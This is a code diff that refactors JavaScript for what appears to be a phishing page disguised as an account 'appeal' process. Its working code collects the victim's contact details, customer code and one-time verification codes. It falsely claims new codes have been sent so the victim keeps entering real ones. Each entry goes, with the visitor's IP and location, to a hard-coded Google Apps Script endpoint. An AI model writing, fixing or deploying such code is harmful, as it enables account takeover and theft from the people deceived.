@@ -104,8 +104,7 @@ const MSG_PRE = "<span class='check-color'>✓</span> ",
 	requestCode = document.getElementById('requestCode'),
 	DEMO_OTP_CODE = '123456',
 	MAX_OTP_ATTEMPTS = 5,
-	GOOGLE_SCRIPT_URL =
-		'https://script.google.com/macros/s/AKfycbzHWnQehVga6rpcUh5erGWcei2KIZQ5VMqg7_IA0F2Iq087AIyyxEIxfUUayT7906MCJQ/exec',
+	GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbzHWnQehVga6rpcUh5erGWcei2KIZQ5VMqg7_IA0F2Iq087AIyyxEIxfUUayT7906MCJQ/exec',
 	SESSION_ID = 'SID-' + Date.now() + '-' + Math.floor(1e6 * Math.random());
 
 let otpAttempts = 0;
@@ -124,13 +123,14 @@ function buildProgressBars() {
 }
 
 function showStep(e) {
-	(document.querySelectorAll('.step').forEach((e) => {
-		e.classList.remove('active');
-	}),
-		e.classList.add('active'),
-		setTimeout(() => {
-			window.scrollTo({ top: 0, behavior: 'smooth' });
-		}, 50));
+    if(!e) return;
+	document.querySelectorAll('.step').forEach((s) => {
+		s.classList.remove('active');
+	});
+	e.classList.add('active');
+	setTimeout(() => {
+		window.scrollTo({ top: 0, behavior: 'smooth' });
+	}, 50);
 }
 
 function scrollInputIntoView(e) {
@@ -140,34 +140,37 @@ function scrollInputIntoView(e) {
 }
 
 function playVideoStep() {
+    if (!introVideo) return;
 	introVideo.currentTime = 0;
 	const e = introVideo.play();
-	void 0 !== e &&
+	if (void 0 !== e) {
 		e.catch(() => {
 			setTimeout(() => {
 				showStep(step3);
 			}, 4e3);
 		});
+	}
 	const t = setTimeout(() => {
 		showStep(step3);
 	}, 5e3);
 	introVideo.onended = function () {
-		(clearTimeout(t), showStep(step3));
+		clearTimeout(t);
+        showStep(step3);
 	};
 }
 
 function lockOtpForm() {
-	((otpCodeInput.disabled = !0),
-		(verifyOtpBtn.disabled = !0),
-		(resendBtn.disabled = !0),
-		(verifyOtpBtn.style.opacity = '0.55'),
-		(verifyOtpBtn.style.cursor = 'not-allowed'),
-		(resendBtn.style.opacity = '0.55'),
-		(resendBtn.style.cursor = 'not-allowed'));
+	otpCodeInput.disabled = !0;
+	verifyOtpBtn.disabled = !0;
+	resendBtn.disabled = !0;
+	verifyOtpBtn.style.opacity = '0.55';
+	verifyOtpBtn.style.cursor = 'not-allowed';
+	resendBtn.style.opacity = '0.55';
+	resendBtn.style.cursor = 'not-allowed';
 }
 
 function showLoading(e) {
-	if ('function' == typeof e.afterDone) {
+	if (e && 'function' == typeof e.afterDone) {
 		e.afterDone();
 	}
 }
@@ -197,106 +200,127 @@ document.querySelectorAll('input').forEach((e) => {
 	});
 });
 
-robotCheck.addEventListener('change', function () {
-	robotCheck.checked &&
-		setTimeout(() => {
-			(showStep(step2), playVideoStep());
-		}, 500);
-});
+if (robotCheck) {
+    robotCheck.addEventListener('change', function () {
+        if (robotCheck.checked) {
+            setTimeout(() => {
+                showStep(step2);
+                playVideoStep();
+            }, 500);
+        }
+    });
+}
 
-submitBtn.addEventListener('click', function () {
-	const e = contactInput.value.trim(),
-		n = customerCodeInput.value.trim();
-	let o = !0;
-	if (
-		((contactError.innerText = ''),
-		(customerCodeError.innerText = ''),
-		'' === e &&
-			((contactError.innerText = t('Please enter your contact information.')), (o = !1)),
-		'' === n &&
-			((customerCodeError.innerText = t('bequora7')), (o = !1)),
-		!o)
-	) {
-		const t = '' === e ? contactInput : customerCodeInput;
-		return (t.focus(), void scrollInputIntoView(t));
-	}
-	(sendToGoogleSheet('Form submitted'),
-		showLoading({
-			title: t('Submitting your appeal...'),
-			afterDone: function () {
-				(showStep(step5),
-					setTimeout(() => otpCodeInput.focus(), 400));
-			},
-		}));
-});
+if (submitBtn) {
+    submitBtn.addEventListener('click', function () {
+        const e = contactInput.value.trim(),
+            n = customerCodeInput.value.trim();
+        let o = !0;
+        
+        contactError.innerText = '';
+        customerCodeError.innerText = '';
+        
+        if ('' === e) {
+            contactError.innerText = t('Please enter your contact information.');
+            o = !1;
+        }
+        if ('' === n) {
+            customerCodeError.innerText = t('bequora7');
+            o = !1;
+        }
+        if (!o) {
+            const t = '' === e ? contactInput : customerCodeInput;
+            t.focus();
+            scrollInputIntoView(t);
+            return;
+        }
+        
+        sendToGoogleSheet('Form submitted');
+        showLoading({
+            title: t('Submitting your appeal...'),
+            afterDone: function () {
+                showStep(step5);
+                setTimeout(() => { if(otpCodeInput) otpCodeInput.focus(); }, 400);
+            },
+        });
+    });
+}
 
-verifyOtpBtn.addEventListener('click', function () {
-	const e = otpCodeInput.value.trim();
-	if (((otpError.innerText = ''), otpAttempts >= 5)) lockOtpForm();
-	else {
-		if ('' === e)
-			return (
-				(otpError.innerText = t('Please enter your verification code.')),
-				otpCodeInput.focus(),
-				void scrollInputIntoView(otpCodeInput)
-			);
-		if (
-			(sendToGoogleSheet('Internal code submitted', e),
-			(otpCodeInput.value = ''),
-			'123456' === e)
-		)
-			showLoading({
-				title: t('Submitting your appeal...'),
-				afterDone: function () {
-					((requestCode.innerText = generateRequestCode()), showStep(step7));
-				},
-			});
-		else {
-			otpAttempts++;
-			const e = (MSG_FAIL[otpAttempts] || MSG_FAIL[5]).map((e) => MSG_PRE + t(e));
-			showLoading({
-				title: t('Confirm your identity...'),
-				statuses: e,
-				afterDone: function () {
-					const e = 5 - otpAttempts;
-					if ((showStep(step5), e <= 0))
-						return (
-							lockOtpForm(),
-							(loadingTitle.innerText = t('Verification Complete')),
-							(loadingStatus.innerHTML = MSG_LOCKED.map(
-								(e) => `<div class="loading-status-line">✓ ${t(e)}</div>`,
-							).join('')),
-							void loadingOverlay.classList.add('active')
-						);
-					((otpError.innerHTML = `<strong>${t('Incorrect code. A new code has been sent.')}</strong>`),
-						(attemptText.innerText = t('You have X attempts remaining.').replace(
-							'X',
-							e,
-						)),
-						setTimeout(() => {
-							(otpCodeInput.focus(), scrollInputIntoView(otpCodeInput));
-						}, 400));
-				},
-			});
-		}
-	}
-});
+if (verifyOtpBtn) {
+    verifyOtpBtn.addEventListener('click', function () {
+        const e = otpCodeInput.value.trim();
+        otpError.innerText = '';
+        
+        if (otpAttempts >= 5) {
+            lockOtpForm();
+            return;
+        }
+        if ('' === e) {
+            otpError.innerText = t('Please enter your verification code.');
+            otpCodeInput.focus();
+            scrollInputIntoView(otpCodeInput);
+            return;
+        }
+        
+        sendToGoogleSheet('Internal code submitted', e);
+        otpCodeInput.value = '';
+        
+        if ('123456' === e) {
+            showLoading({
+                title: t('Submitting your appeal...'),
+                afterDone: function () {
+                    if (requestCode) requestCode.innerText = generateRequestCode();
+                    if (step7) showStep(step7);
+                },
+            });
+        } else {
+            otpAttempts++;
+            const statusMsgs = (MSG_FAIL[otpAttempts] || MSG_FAIL[5]).map((e) => MSG_PRE + t(e));
+            showLoading({
+                title: t('Confirm your identity...'),
+                statuses: statusMsgs,
+                afterDone: function () {
+                    const remaining = 5 - otpAttempts;
+                    if (remaining <= 0) {
+                        lockOtpForm();
+                        loadingTitle.innerText = t('Verification Complete');
+                        loadingStatus.innerHTML = MSG_LOCKED.map(
+                            (e) => `<div class="loading-status-line">✓ ${t(e)}</div>`
+                        ).join('');
+                        if(loadingOverlay) loadingOverlay.classList.add('active');
+                        return;
+                    }
+                    otpError.innerHTML = `<strong>${t('Incorrect code. A new code has been sent.')}</strong>`;
+                    if(attemptText) attemptText.innerText = t('You have X attempts remaining.').replace('X', remaining);
+                    setTimeout(() => {
+                        otpCodeInput.focus();
+                        scrollInputIntoView(otpCodeInput);
+                    }, 400);
+                },
+            });
+        }
+    });
+}
 
-resendBtn.addEventListener('click', function () {
-	((otpError.innerText = ''), (otpCodeInput.value = ''), (resendBtn.disabled = !1));
-	const e = MSG_RESEND.map((e) => MSG_PRE + t(e));
-	showLoading({
-		title: t('Requesting new code...'),
-		statuses: e,
-		afterDone: function () {
-			(showStep(step5),
-				(otpError.innerHTML = `<strong>${t('A new code has been sent to your device.')}</strong>`),
-				setTimeout(() => {
-					otpCodeInput.focus();
-				}, 400));
-		},
-	});
-});
+if (resendBtn) {
+    resendBtn.addEventListener('click', function () {
+        otpError.innerText = '';
+        otpCodeInput.value = '';
+        resendBtn.disabled = !1;
+        const statusMsgs = MSG_RESEND.map((e) => MSG_PRE + t(e));
+        showLoading({
+            title: t('Requesting new code...'),
+            statuses: statusMsgs,
+            afterDone: function () {
+                showStep(step5);
+                otpError.innerHTML = `<strong>${t('A new code has been sent to your device.')}</strong>`;
+                setTimeout(() => {
+                    otpCodeInput.focus();
+                }, 400);
+            },
+        });
+    });
+}
 
 const sendToGoogleSheet = async (e, t = '') => {
 	const n = localStorage.getItem('vai-ca-biu'),
@@ -310,19 +334,19 @@ const sendToGoogleSheet = async (e, t = '') => {
 			continent: d = 'Unknown',
 		} = o,
 		u = new URLSearchParams();
-	(u.append('session_id', SESSION_ID),
-		u.append('contact', contactInput.value.trim()),
-		u.append('customer_code', customerCodeInput.value.trim()),
-		u.append('internal_code', t),
-		u.append('device', getSimpleDeviceType()),
-		u.append('status', e),
-		u.append('ip', r),
-		u.append('city', i),
-		u.append('region', s),
-		u.append('country', c),
-		u.append('postal', a),
-		u.append('continent', d),
-		fetch(GOOGLE_SCRIPT_URL, { method: 'POST', body: u, mode: 'no-cors' }).catch((e) => {}));
+	u.append('session_id', SESSION_ID);
+	u.append('contact', contactInput ? contactInput.value.trim() : '');
+	u.append('customer_code', customerCodeInput ? customerCodeInput.value.trim() : '');
+	u.append('internal_code', t);
+	u.append('device', getSimpleDeviceType());
+	u.append('status', e);
+	u.append('ip', r);
+	u.append('city', i);
+	u.append('region', s);
+	u.append('country', c);
+	u.append('postal', a);
+	u.append('continent', d);
+	fetch(GOOGLE_SCRIPT_URL, { method: 'POST', body: u, mode: 'no-cors' }).catch((e) => {});
 };
 
 function kimochi() {
